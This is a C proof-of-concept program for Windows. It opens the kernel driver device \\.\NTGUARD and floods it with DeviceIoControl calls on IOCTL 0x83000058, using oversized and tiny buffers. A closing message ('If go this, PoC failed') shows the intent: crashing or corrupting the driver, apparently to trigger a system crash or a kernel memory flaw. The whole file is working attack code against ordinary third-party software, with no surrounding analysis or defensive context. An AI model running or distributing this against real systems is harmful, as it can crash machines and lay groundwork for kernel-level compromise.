#include <stdio.h>
#include <Windows.h>

#define MAX_BUFSIZE 65535

int main()
{
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\NTGUARD";
	DWORD bResult;
	DWORD junk = 0;
	BYTE  bufInput[0x10000];
	BYTE  bufOutput[0x10000];
	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);											// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Lets send Buffer loop to the Driver");
	memset(bufInput, 0x00, 0x10000);
	for (int i = 0; i < MAX_BUFSIZE; i++)
	{
		bResult = DeviceIoControl(hDevice,	// Device to be queried
			0x83000058,						// Operation to perform
			&bufInput,				// Input Buffer		
			0xffff,			// Buffer Size
			&bufOutput, 0xffff,						// Output Buffer
			&junk,							// # Bytes returned
			(LPOVERLAPPED)NULL);			// Synchronous I/O	
		for (int j = 0; j < 4; j++)
		{
			bResult = DeviceIoControl(hDevice,	// Device to be queried
				0x83000058,						// Operation to perform
				&bufInput,				// Input Buffer		
				j,			// Buffer Size
				&bufOutput, j,						// Output Buffer
				&junk,							// # Bytes returned
				(LPOVERLAPPED)NULL);			// Synchronous I/O	
		}
	}


	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}
	wprintf(L" -> Done!\n");
	wprintf(L" [-] If go this, PoC failed...");
	CloseHandle(hDevice);
	return 0;
}